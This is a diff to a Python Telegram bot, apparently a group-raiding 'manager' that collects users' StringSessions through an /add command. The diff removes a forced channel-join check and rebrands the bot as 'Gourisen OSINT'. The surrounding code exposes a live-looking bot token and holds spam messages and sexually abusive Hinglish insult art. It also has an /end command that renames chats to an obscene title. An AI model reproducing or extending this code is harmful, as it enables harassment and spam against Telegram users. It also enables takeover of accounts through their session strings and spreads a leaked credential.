@@ -44,11 +44,6 @@ BOT_TOKEN = "8485202414:AAEEYv7_UjUR2DI4KN9l4bEKnsD9v0WGn7E"
 
 OWNER_ID = 7727470646 # ✅ Aapki Owner ID
 
-# ✅ FORCE SUBSCRIBE CONFIG
-FORCE_CHANNEL_ID = -1003892920891  
-FORCE_CHANNEL_LINK = "https://t.me/+Om1HMs2QTHk1N2Zh" 
-FORCE_GROUP = "Anysnapsupport"
-
 # Main Manager Bot
 bot = Client("MagmaManager", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
@@ -67,7 +62,7 @@ waiting_for_ad = {}
 active_ads = {}
 ad_content = {}
 
-# --- NEW START MESSAGE STORAGE ---
+# --- NEW START MESSAGE STORAGE (Fixed Quotes & Emojis) ---
 START_DATA = {
     "type": "text",      
     "file_id": None,     
@@ -84,28 +79,6 @@ SPAM_MESSAGES = [
 ]
 
 # ==================== HELPER FUNCTIONS ====================
-
-async def check_force_subscribe(client, message):
-    user_id = message.from_user.id
-    try:
-        await client.get_chat_member(FORCE_CHANNEL_ID, user_id)
-        await client.get_chat_member(FORCE_GROUP, user_id)
-        return True
-    except UserNotParticipant:
-        buttons = [
-            [InlineKeyboardButton("📢 Join Channel", url=FORCE_CHANNEL_LINK)],
-            [InlineKeyboardButton("👥 Join Group", url=f"https://t.me/{FORCE_GROUP}")],
-        ]
-        await message.reply(
-            "**⛔ ACCESS DENIED!**\n\n"
-            "You must join our Channel and Group to use this bot.\n"
-            "Join then try again!",
-            reply_markup=InlineKeyboardMarkup(buttons)
-        )
-        return False
-    except Exception as e:
-        print(f"FS Error: {e}")
-        return True 
 
 async def smart_edit(message, text, sleep_time=0.5):
     try:
@@ -357,7 +330,7 @@ async def love_handler(client, message):
 async def yourmom_handler(client, message):
     await smart_edit(message, "🤱 **Searching for Mom...**")
     await smart_edit(message, "🫦 **Target Locked!**")
-    header = "🤱 ANYSNAP USER'S VS YOUR MOM 💋"
+    header = "🤱 Gourisen OSINT USER'S VS YOUR MOM 💋"
     footer = "TERI MAA MERI LUND PE 🥵💋"
     await draw_art(message, YOURMOM_ART, header=header, footer=footer)
 
@@ -668,7 +641,7 @@ async def end_cmd(client, message):
         return
 
     try:
-        await client.set_chat_title(chat_id, "FUCK BY ANYSNAP USER")
+        await client.set_chat_title(chat_id, "FUCK BY Gourisen OSINT USER")
     except Exception:
         pass
 
@@ -786,29 +759,27 @@ async def save_start_with_media(client, message):
     
     reply = message.reply_to_message
     
-    # Agar Photo hai
+    # Ye logic Entities (Quote aur Premium Emojis) ko save karega
     if reply.photo:
         START_DATA["type"] = "photo"
         START_DATA["file_id"] = reply.photo.file_id
         START_DATA["text"] = reply.caption
         START_DATA["entities"] = reply.caption_entities
-        await message.reply_text("🖼️ Photo aur Premium Emojis dono save ho gaye!")
+        await message.reply_text("🖼️ Photo aur Premium Emojis/Quotes dono save ho gaye!")
 
-    # Agar Video hai
     elif reply.video:
         START_DATA["type"] = "video"
         START_DATA["file_id"] = reply.video.file_id
         START_DATA["text"] = reply.caption
         START_DATA["entities"] = reply.caption_entities
-        await message.reply_text("🎥 Video aur Premium Emojis dono save ho gaye!")
+        await message.reply_text("🎥 Video aur Premium Emojis/Quotes dono save ho gaye!")
 
-    # Agar sirf Text hai
     elif reply.text:
         START_DATA["type"] = "text"
         START_DATA["file_id"] = None
         START_DATA["text"] = reply.text
         START_DATA["entities"] = reply.entities
-        await message.reply_text("📝 Text aur Premium Emojis save ho gaye!")
+        await message.reply_text("📝 Text aur Premium Emojis/Quotes save ho gaye!")
         
     else:
         await message.reply_text("⚠️ Ye format support nahi kar raha, bhai. Photo, Video ya Text bhejo.")
@@ -816,27 +787,28 @@ async def save_start_with_media(client, message):
 
 @bot.on_message(filters.command("start") & filters.private)
 async def start_cmd(client, message):
-    if not await check_force_subscribe(client, message):
-        return
-
     global START_DATA
 
+    # Ye rahe aapke poore 3-Line Buttons
     buttons = InlineKeyboardMarkup(
         [
             [InlineKeyboardButton("🎵 Aᴅᴅ Mᴇ Tᴏ Yᴏᴜʀ Gʀᴏᴜᴘ", url=f"https://t.me/{client.me.username}?startgroup=true")],
+            [
+                InlineKeyboardButton("📚 Cᴏᴍᴍᴀɴᴅs", callback_data="commands"),
+                InlineKeyboardButton("⚙️ Sᴇᴛᴛɪɴɢs", callback_data="settings")
+            ],
             [InlineKeyboardButton("👨‍💻 Gourisen OSINT", url="https://t.me/your_username_here")]
         ]
     )
 
     try:
-        # Quote format ke sath exact same message wapas bhejega, emojis ke sath!
+        # Yahan se maine quote=True hata diya hai. Ab ye direct entities (Blockquote aur Emojis) ke sath message bhejega.
         if START_DATA["type"] == "photo" and START_DATA["file_id"]:
             await message.reply_photo(
                 photo=START_DATA["file_id"], 
                 caption=START_DATA["text"], 
                 caption_entities=START_DATA["entities"],
-                reply_markup=buttons,
-                quote=True
+                reply_markup=buttons
             )
             
         elif START_DATA["type"] == "video" and START_DATA["file_id"]:
@@ -844,16 +816,14 @@ async def start_cmd(client, message):
                 video=START_DATA["file_id"], 
                 caption=START_DATA["text"], 
                 caption_entities=START_DATA["entities"],
-                reply_markup=buttons,
-                quote=True
+                reply_markup=buttons
             )
             
         elif START_DATA["type"] == "text" and START_DATA["text"]:
             await message.reply_text(
                 text=START_DATA["text"], 
                 entities=START_DATA["entities"],
-                reply_markup=buttons,
-                quote=True
+                reply_markup=buttons
             )
             
         else:
@@ -876,7 +846,7 @@ async def start_cmd(client, message):
 
 ⚠️ **Note:** Keep your session safe!
 """
-            await message.reply_text(text, reply_markup=buttons, quote=True)
+            await message.reply_text(text, reply_markup=buttons)
             
     except Exception as e:
         print(f"Start Error: {e}")
@@ -885,9 +855,6 @@ async def start_cmd(client, message):
 
 @bot.on_message(filters.command("add") & filters.private)
 async def add_session_handler(client, message):
-    if not await check_force_subscribe(client, message):
-        return
-
     if len(message.command) < 2:
         await message.reply("❌ Usage: `/add <StringSession>`")
         return
